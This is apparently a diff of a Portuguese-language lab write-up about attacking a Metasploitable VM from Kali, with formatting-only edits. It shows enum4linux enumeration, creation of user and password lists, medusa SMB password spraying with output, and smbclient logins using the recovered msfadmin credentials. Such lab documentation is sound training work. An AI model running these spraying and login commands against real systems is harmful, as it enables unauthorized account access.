@@ -14,7 +14,8 @@
 
 Acesso negado no FTP:
 
-```                                                                                                                                                                                                                                       
+
+```                                                                                                                                                                                                                                   
 ┌──(kali㉿kali)-[~]
 └─$ ftp 192.168.56.102
 Connected to 192.168.56.102.
@@ -192,12 +193,14 @@ enum4linux -a 192.168.56.102 | tee enum_output.txt
 ## Password spraying em SMB com enumeração de usuários.
 
 Linhas de comando para gerar os senhas:
+
 ```
 echo -e "user\nadmin\nmsfadmin\nservice" > smb_users.txt 
 echo -e "passowrd\n123456\nWelome123\nmsfadmin" > senhas_spray.txt
 ```
 
-O comando: 
+O comando:
+
 ```
 medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smnt -t 2- T50
 ```
@@ -205,7 +208,7 @@ medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smnt -t 2- T50
 Execução comando:
 
 ```                                                                                                                                                                                                                
-┌──(kali㉿kali)-[~]
+┌──(kali@kali)-[~]
 └─$ medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2- T50
 Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
 
@@ -234,7 +237,7 @@ Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.n
 Para validação do acesso encontrado, executamos:
 
 ```
-(kali㉿kali)-[~]
+(kali@kali)-[~]
 └─$  smbclient -L //192.168.56.102 -U msfadmin
 Password for [WORKGROUP\msfadmin]:
 
@@ -255,7 +258,7 @@ Reconnecting with SMB1 for workgroup listing.
         ---------            -------
         WORKGROUP            METASPLOITABLE
                                                                                                                                                                                                                                             
-┌──(kali㉿kali)-[~]
+┌──(kali@kali)-[~]
 └─$ 
 ```
 ## Conclusão
